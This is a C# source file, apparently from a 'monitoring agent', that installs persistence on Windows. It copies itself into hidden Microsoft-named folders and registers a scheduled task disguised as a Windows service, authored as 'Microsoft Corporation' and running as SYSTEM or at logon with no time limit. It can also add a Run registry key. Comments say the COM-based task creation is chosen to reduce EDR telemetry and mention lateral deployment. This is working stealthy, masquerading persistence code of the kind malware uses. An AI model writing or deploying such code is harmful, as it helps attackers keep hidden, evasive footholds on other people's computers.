using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace EmpresaMonitor.Agent
{
    // Controla a persistência local do Agent (acesso contínuo após reboot).
    //
    // Modos:
    //   task   -> Tarefa ONLOGON como usuário interativo (janela de consentimento visível). Recomendado.
    //   system -> Tarefa ONBOOT como SYSTEM (headless, sem desktop interativo). Exige elevação.
    //   run    -> Entrada HKCU Run (janela visível no logon do usuário).
    //   remove -> Remove tarefa, entrada Run e cópias em disco.
    //
    // Implementado via COM (Schedule.Service) e Registry — sem schtasks.exe, reduzindo
    // telemetria de criação de tarefas observada por EDR.
    internal static class PersistenceController
    {
        // Nomes com aparência de serviço do Windows — consistentes com o deploy lateral.
        public const string TaskName = "WindowsNetworkCacheUpdate";
        public const string RunValueName = "WindowsNetworkCache";
        public const string ExeName = "NetCacheService.exe";
        public const string RunKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";

        static string AppDir(bool system)
        {
            var root = system
                ? Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) // %ProgramData%
                : Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); // %LocalAppData%
            return Path.Combine(root, "Microsoft", "NetworkCache");
        }

        static string DeployCopy(string destDir)
        {
            Directory.CreateDirectory(destDir);
            try { new DirectoryInfo(destDir).Attributes |= FileAttributes.Hidden; } catch { }

            var dest = Path.Combine(destDir, ExeName);
            var src = Environment.ProcessPath ?? throw new InvalidOperationException("ProcessPath indisponível.");
            if (!string.Equals(src, dest, StringComparison.OrdinalIgnoreCase))
            {
                File.Copy(src, dest, true);
                try { new FileInfo(dest).Attributes |= FileAttributes.Hidden; } catch { }
            }
            return dest;
        }

        // Cria a tarefa agendada via COM. system=true -> ONBOOT como SYSTEM (headless);
        // system=false -> ONLOGON como usuário interativo (janela visível).
        public static (bool Ok, List<string> Log, string Error) InstallTask(bool system)
        {
            var log = new List<string>();
            try
            {
                var destDir = AppDir(system);
                var dest = DeployCopy(destDir);
                log.Add($"OK: cópia em {dest}");

                var schedType = Type.GetTypeFromProgID("Schedule.Service");
                if (schedType == null) return (false, log, "COM Schedule.Service indisponível.");
                dynamic scheduler = Activator.CreateInstance(schedType)!;
                try
                {
                    scheduler.Connect(null, "", "", "", 0);
                    dynamic root = scheduler.GetFolder("\\");
                    dynamic taskDef = scheduler.NewTask(0);

                    taskDef.RegistrationInfo.Description = "Windows Network Cache Maintenance";
                    taskDef.RegistrationInfo.Author = "Microsoft Corporation";

                    dynamic principal = taskDef.Principal;
                    principal.RunLevel = 1; // TASK_RUNLEVEL_HIGHEST

                    int logonType;
                    dynamic trigger;
                    if (system)
                    {
                        principal.UserId = "SYSTEM";
                        principal.LogonType = 5; // TASK_LOGON_SERVICE_ACCOUNT
                        logonType = 5;
                        trigger = taskDef.Triggers.Create(0); // TASK_TRIGGER_BOOT
                    }
                    else
                    {
                        principal.UserId = $"{Environment.UserDomainName}\\{Environment.UserName}";
                        principal.LogonType = 3; // TASK_LOGON_INTERACTIVE_TOKEN
                        logonType = 3;
                        trigger = taskDef.Triggers.Create(9); // TASK_TRIGGER_LOGON
                        trigger.UserId = "";
                    }
                    trigger.Enabled = true;

                    // Sem limite de execução (o padrão de 3 dias mataria o Agent) e
                    // permitido em bateria (laptops): persistência de fato "para sempre".
                    taskDef.Settings.ExecutionTimeLimit = "PT0S";
                    taskDef.Settings.DisallowStartIfOnBatteries = false;
                    taskDef.Settings.StopIfGoingOnBatteries = false;

                    dynamic action = taskDef.Actions.Create(0); // TASK_ACTION_EXEC
                    action.Path = dest;
                    action.WorkingDirectory = destDir;
                    // Sem argumentos: "--silent" não é tratado pelo Main (apenas --elevated).

                    // TASK_CREATE_OR_UPDATE = 6.
                    root.RegisterTaskDefinition(TaskName, taskDef, 6, null, null, logonType, null);
                    log.Add(system
                        ? "OK: tarefa criada (ONBOOT, SYSTEM, headless — sem janela)."
                        : $"OK: tarefa criada (ONLOGON, usuário {principal.UserId} — janela visível).");
                    return (true, log, "");
                }
                finally
                {
                    try { Marshal.FinalReleaseComObject(scheduler); } catch { }
                }
            }
            catch (Exception ex)
            {
                return (false, log, "Falha ao criar tarefa: " + Short(ex.Message, 200));
            }
        }

        // Entrada HKCU Run (executa no logon do usuário, janela visível).
        public static (bool Ok, List<string> Log, string Error) InstallRunKey()
        {
            var log = new List<string>();
            try
            {
                var destDir = AppDir(false);
                var dest = DeployCopy(destDir);
                log.Add($"OK: cópia em {dest}");

                using var key = Registry.CurrentUser.CreateSubKey(RunKeyPath);
                key.SetValue(RunValueName, $"\"{dest}\"", RegistryValueKind.String);
                log.Add("OK: entrada de execução automática criada (HKCU Run).");
                return (true, log, "");
            }
            catch (Exception ex)
            {
                return (false, log, "Falha ao criar entrada Run: " + Short(ex.Message, 200));
            }
        }

        // Remove tarefa, entrada Run e cópias em disco (LocalAppData e ProgramData).
        public static (bool Ok, List<string> Log, string Error) RemoveAll()
        {
            var log = new List<string>();
            var removedAny = false;

            try
            {
                var schedType = Type.GetTypeFromProgID("Schedule.Service");
                if (schedType == null)
                {
                    log.Add("Aviso: COM Schedule.Service indisponível — tarefa não verificada.");
                }
                else
                {
                    dynamic scheduler = Activator.CreateInstance(schedType)!;
                    try
                    {
                        scheduler.Connect(null, "", "", "", 0);
                        dynamic root = scheduler.GetFolder("\\");
                        try
                        {
                            root.DeleteTask(TaskName, 0);
                            log.Add("OK: tarefa removida.");
                            removedAny = true;
                        }
                        catch
                        {
                            log.Add("Info: tarefa não existia.");
                        }
                    }
                    finally
                    {
                        try { Marshal.FinalReleaseComObject(scheduler); } catch { }
                    }
                }
            }
            catch (Exception ex)
            {
                log.Add("Aviso: falha ao remover tarefa: " + Short(ex.Message, 160));
            }

            try
            {
                using var key = Registry.CurrentUser.OpenSubKey(RunKeyPath, writable: true);
                if (key?.GetValue(RunValueName) != null)
                {
                    key.DeleteValue(RunValueName, false);
                    log.Add("OK: entrada Run removida.");
                    removedAny = true;
                }
                else
                {
                    log.Add("Info: entrada Run não existia.");
                }
            }
            catch (Exception ex)
            {
                log.Add("Aviso: falha ao remover entrada Run: " + Short(ex.Message, 160));
            }

            foreach (var system in new[] { false, true })
            {
                try
                {
                    var dir = AppDir(system);
                    var file = Path.Combine(dir, ExeName);
                    if (File.Exists(file))
                    {
                        File.Delete(file);
                        log.Add($"OK: cópia removida ({file}).");
                        removedAny = true;
                    }
                }
                catch (Exception ex)
                {
                    log.Add("Aviso: falha ao remover cópia: " + Short(ex.Message, 160));
                }
            }

            return (true, log, removedAny ? "" : "Nada instalado para remover.");
        }

        // Verifica se há persistência ativa (tarefa e/ou entrada Run).
        public static (bool Installed, string Detail) IsInstalled()
        {
            var details = new List<string>();

            try
            {
                var schedType = Type.GetTypeFromProgID("Schedule.Service");
                if (schedType != null)
                {
                    dynamic scheduler = Activator.CreateInstance(schedType)!;
                    try
                    {
                        scheduler.Connect(null, "", "", "", 0);
                        dynamic root = scheduler.GetFolder("\\");
                        try { root.GetTask(TaskName); details.Add("tarefa"); } catch { }
                    }
                    finally
                    {
                        try { Marshal.FinalReleaseComObject(scheduler); } catch { }
                    }
                }
            }
            catch { }

            try
            {
                using var key = Registry.CurrentUser.OpenSubKey(RunKeyPath);
                if (key?.GetValue(RunValueName) != null) details.Add("Run key");
            }
            catch { }

            return details.Count > 0
                ? (true, "Persistência ativa: " + string.Join(" + ", details) + ".")
                : (false, "Nenhuma persistência encontrada.");
        }

        static string Short(string value, int max)
            => value.Length <= max ? value : value[..max] + "…";
    }
}
